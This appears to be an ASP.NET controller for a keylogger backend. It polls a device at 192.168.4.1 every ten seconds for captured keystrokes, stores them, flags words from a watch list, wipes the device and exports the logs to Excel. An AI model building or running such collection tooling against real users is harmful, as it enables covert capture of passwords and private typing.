using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Rendering;
using Microsoft.EntityFrameworkCore;
using KeyLoggerApi.Models;
using Hangfire;
using System.Net.Http;
using System.Text;
using ClosedXML.Excel;
using System.IO;
using Hangfire.Storage;

namespace KeyLoggerApi.Controllers
{
    public class KeyloggerController : Controller
    {
        private readonly KeyloggerContext _context;

        public KeyloggerController(KeyloggerContext context)
        {
            _context = context;
        }

        // GET: Keylogger
        public async Task<IActionResult> Index()
        {
            return View(await _context.Keyloggers.ToListAsync());
        }

        //public async Task<string> GetKey()
        //{
        //    string baseUrl = "http://localhost:8889/keylog2.html";
        //    var client = new HttpClient();
        //    var data = await client.GetStringAsync(baseUrl);

        //    var wordList = await _context.WordLists.ToListAsync();

        //    if (!string.IsNullOrEmpty(data))
        //    {
        //        string addSpace = data.Replace("<", " <");
        //        string replaceString = addSpace.Replace("\n ", " ");
        //        replaceString = replaceString.Replace("\n", " ");
        //        List<string> words;
        //        words = replaceString.Split(" ").ToList();
        //        foreach (var word in words)
        //        {
        //            DetectedWord detectedWord = new DetectedWord();
        //            Keylogger keylogger = new Keylogger();
        //            WordList detection = new WordList();

        //            keylogger.Keystroke = word;
        //            _context.Add(keylogger);
                    
        //            detection = wordList.Where(x => x.Description.ToLower() == word.ToLower()).FirstOrDefault();
        //            if (detection != null)
        //            {
        //                detectedWord.Description = detection.Description;
        //                _context.Add(detectedWord);
        //            }
        //            await _context.SaveChangesAsync();
        //        }
        //    }                      
           
        //    return data;
        //}

        public async Task<string> GetKey()
        {
            //string baseUrl = "http://localhost:8889/keylog2.html";
            string baseUrl = "http://192.168.4.1";
            var client = new HttpClient();
            var data = await client.GetStringAsync(baseUrl);

            var wordList = await _context.WordLists.Select(x => x.Description).ToListAsync();

            if (!string.IsNullOrEmpty(data))
            {
                Keylogger keylogger = new Keylogger();

                keylogger.Keystroke = data;
                _context.Add(keylogger);

                var detections = wordList.Where(x => data.Contains(x)).ToList();
                if (detections != null)
                {
                    foreach (var detection in detections)
                    {
                        DetectedWord detectedWord = new DetectedWord();
                        detectedWord.Description = detection;
                        _context.Add(detectedWord);
                    }

                }
                await _context.SaveChangesAsync();
                //clear the data after save
                string baseUrl2 = "http://192.168.4.1/clear";
                var client2 = new HttpClient();
                var data2 = await client.GetStringAsync(baseUrl2);
            }

            return data; 
        }

        public async Task<IActionResult> StartLogging()
        {
            using (var connection = JobStorage.Current.GetConnection())
            {
                foreach (var recurringJob in connection.GetRecurringJobs())
                {
                    RecurringJob.RemoveIfExists(recurringJob.Id);
                }
            }

            RecurringJob.AddOrUpdate(() => GetKey(), "*/10 * * * * *");

            return Json(new { status = true });
        }

        public async Task<IActionResult> StopLogging()
        {
            using (var connection = JobStorage.Current.GetConnection())
            {
                foreach (var recurringJob in connection.GetRecurringJobs())
                {
                    RecurringJob.RemoveIfExists(recurringJob.Id);
                }
            }

            return Json(new { status = true });
        }

        public async Task<IActionResult>DeleteAll()
        {
            await _context.Database.ExecuteSqlRawAsync("TRUNCATE TABLE [Keyloggers]");
            return RedirectToAction("Index");

        }

        public async Task<IActionResult> KeystrokeByDateTime(DateTime date, int time)
        {
            List<Keylogger> dataByDate = new List<Keylogger>();
            List<Keylogger> dataByTime = new List<Keylogger>();
            List<KeyData> result = new List<KeyData>();
            
            dataByDate = await _context.Keyloggers.Where(x => x.CreationDate.Date == date.Date).ToListAsync();

            switch (time)
            {
                case 1:
                    dataByTime = dataByDate.Where(x => x.CreationDate.Hour > 0 && x.CreationDate.Hour <= 6).ToList();
                    break;
                case 2:
                    dataByTime = dataByDate.Where(x => x.CreationDate.Hour > 6 && x.CreationDate.Hour <= 12).ToList();
                    break;
                case 3:
                    dataByTime = dataByDate.Where(x => x.CreationDate.Hour > 12 && x.CreationDate.Hour <= 18).ToList();
                    break;
                case 4:
                    dataByTime = dataByDate.Where(x => x.CreationDate.Hour > 18 && x.CreationDate.Hour <= 24).ToList();
                    
                    break;
            }
            if (dataByTime.Count > 0)
            {
                foreach (var data in dataByTime)
                {
                    KeyData resultModel = new KeyData();
                    resultModel.CreationDate = data.CreationDate.ToString("dd/MM/yyyy hh:mm:ss tt");
                    resultModel.Id = data.Id;
                    resultModel.Keystroke = data.Keystroke;
                    result.Add(resultModel);
                }
            }
            
            return Json(result);
        }


        // GET: Keylogger/Details/5
        public async Task<IActionResult> Details(int? id)
        {
            if (id == null)
            {
                return NotFound();
            }

            var keylogger = await _context.Keyloggers
                .FirstOrDefaultAsync(m => m.Id == id);
            if (keylogger == null)
            {
                return NotFound();
            }

            return View(keylogger);
        }

        // GET: Keylogger/Create
        public IActionResult Create()
        {
            return View();
        }

        // POST: Keylogger/Create
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details, see http://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Create([Bind("Id,Keystroke,CreationDate")] Keylogger keylogger)
        {
            if (ModelState.IsValid)
            {
                _context.Add(keylogger);
                await _context.SaveChangesAsync();
                return RedirectToAction(nameof(Index));
            }
            return View(keylogger);
        }

        // GET: Keylogger/Edit/5
        public async Task<IActionResult> Edit(int? id)
        {
            if (id == null)
            {
                return NotFound();
            }

            var keylogger = await _context.Keyloggers.FindAsync(id);
            if (keylogger == null)
            {
                return NotFound();
            }
            return View(keylogger);
        }

        // POST: Keylogger/Edit/5
        // To protect from overposting attacks, enable the specific properties you want to bind to, for 
        // more details, see http://go.microsoft.com/fwlink/?LinkId=317598.
        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Edit(int id, [Bind("Id,Keystroke,CreationDate")] Keylogger keylogger)
        {
            if (id != keylogger.Id)
            {
                return NotFound();
            }

            if (ModelState.IsValid)
            {
                try
                {
                    _context.Update(keylogger);
                    await _context.SaveChangesAsync();
                }
                catch (DbUpdateConcurrencyException)
                {
                    if (!KeyloggerExists(keylogger.Id))
                    {
                        return NotFound();
                    }
                    else
                    {
                        throw;
                    }
                }
                return RedirectToAction(nameof(Index));
            }
            return View(keylogger);
        }

        // GET: Keylogger/Delete/5
        public async Task<IActionResult> Delete(int? id)
        {
            if (id == null)
            {
                return NotFound();
            }

            var keylogger = await _context.Keyloggers
                .FirstOrDefaultAsync(m => m.Id == id);
            if (keylogger == null)
            {
                return NotFound();
            }

            return View(keylogger);
        }

        // POST: Keylogger/Delete/5
        [HttpPost, ActionName("Delete")]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> DeleteConfirmed(int id)
        {
            var keylogger = await _context.Keyloggers.FindAsync(id);
            _context.Keyloggers.Remove(keylogger);
            await _context.SaveChangesAsync();
            return RedirectToAction(nameof(Index));
        }

        public async Task<IActionResult> PrintAll()
        {
            try
            {
                List<Keylogger> allData = new List<Keylogger>();

                allData = await _context.Keyloggers.ToListAsync();

                string contentType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
                string fileName = "Keystroke_" + DateTime.Now + ".xlsx";

                var workbook = new XLWorkbook();
                IXLWorksheet worksheet = workbook.Worksheets.Add("Keystroke");
                worksheet.Cell(1, 1).Value = "Keystroke";
                worksheet.Cell(1, 2).Value = "Date";
                worksheet.Cell(1, 3).Value = "Time";

                for (int index = 1; index <= allData.Count; index++)
                {
                    worksheet.Cell(index + 1, 1).Value = allData[index - 1].Keystroke;
                    worksheet.Cell(index + 1, 2).Value = allData[index - 1].CreationDate.ToString("MM/dd/yyyy");
                    worksheet.Cell(index + 1, 3).Value = allData[index - 1].CreationDate.ToString("HH:mm:ss");
                }

                using (var stream = new MemoryStream())
                {
                    workbook.SaveAs(stream);
                    var content = stream.ToArray();
                    return File(content, contentType, fileName);
                }
            }
            catch (Exception ex)
            {
                return Error();
            }
        }

        public async Task<IActionResult> PrintByDateTime(DateTime date, int time)
        {
            try
            {
                List<Keylogger> dataByDate = new List<Keylogger>();
                List<Keylogger> dataByTime = new List<Keylogger>();

                dataByDate = await _context.Keyloggers.Where(x => x.CreationDate.Date == date.Date).ToListAsync();

                switch (time)
                {
                    case 1:
                        dataByTime = dataByDate.Where(x => x.CreationDate.Hour > 0 && x.CreationDate.Hour <= 6).ToList();
                        break;
                    case 2:
                        dataByTime = dataByDate.Where(x => x.CreationDate.Hour > 6 && x.CreationDate.Hour <= 12).ToList();
                        break;
                    case 3:
                        dataByTime = dataByDate.Where(x => x.CreationDate.Hour > 12 && x.CreationDate.Hour <= 18).ToList();
                        break;
                    case 4:
                        dataByTime = dataByDate.Where(x => x.CreationDate.Hour > 18 && x.CreationDate.Hour <= 24).ToList();

                        break;
                }
                
                string contentType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
                string fileName = "Keystroke_" + DateTime.Now + ".xlsx";

                var workbook = new XLWorkbook();
                IXLWorksheet worksheet = workbook.Worksheets.Add("Keystroke" + date.ToString("dd MMMM yyyy"));
                worksheet.Cell(1, 1).Value = "Keystroke";
                worksheet.Cell(1, 2).Value = "Date";
                worksheet.Cell(1, 3).Value = "Time";


                for (int index = 1; index <= dataByTime.Count; index++)
                {
                    worksheet.Cell(index + 1, 1).Value = dataByTime[index - 1].Keystroke;
                    worksheet.Cell(index + 1, 2).Value = dataByDate[index - 1].CreationDate.ToString("MM/dd/yyyy");
                    worksheet.Cell(index + 1, 3).Value = dataByDate[index - 1].CreationDate.ToString("HH:mm:ss");
                }

                using (var stream = new MemoryStream())
                {
                    workbook.SaveAs(stream);
                    var content = stream.ToArray();
                    return File(content, contentType, fileName);
                }
            }
            catch(Exception ex)
            {
                return Error();
            }
        }

        public async Task<IActionResult> PrintByDate(DateTime date)
        {
            try
            {
                List<Keylogger> dataByDate = new List<Keylogger>();

                dataByDate = await _context.Keyloggers.Where(x => x.CreationDate.Date == date.Date).ToListAsync();                

                string contentType = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
                string fileName = "Keystroke_" + DateTime.Now + ".xlsx";

                var workbook = new XLWorkbook();
                IXLWorksheet worksheet = workbook.Worksheets.Add("Keystroke" + date.ToString("dd MMMM yyyy"));
                worksheet.Cell(1, 1).Value = "Keystroke";
                worksheet.Cell(1, 2).Value = "Date";
                worksheet.Cell(1, 3).Value = "Time";

                for (int index = 1; index <= dataByDate.Count; index++)
                {
                    worksheet.Cell(index + 1, 1).Value = dataByDate[index - 1].Keystroke;
                    worksheet.Cell(index + 1, 2).Value = dataByDate[index - 1].CreationDate.ToString("MM/dd/yyyy");
                    worksheet.Cell(index + 1, 3).Value = dataByDate[index - 1].CreationDate.ToString("HH:mm:ss");
                }

                using (var stream = new MemoryStream())
                {
                    workbook.SaveAs(stream);
                    var content = stream.ToArray();
                    return File(content, contentType, fileName);
                }
            }
            catch (Exception ex)
            {
                return Error();
            }
        }

        private IActionResult Error()
        {
            throw new NotImplementedException();
        }

        private bool KeyloggerExists(int id)
        {
            return _context.Keyloggers.Any(e => e.Id == id);
        }
    }
}
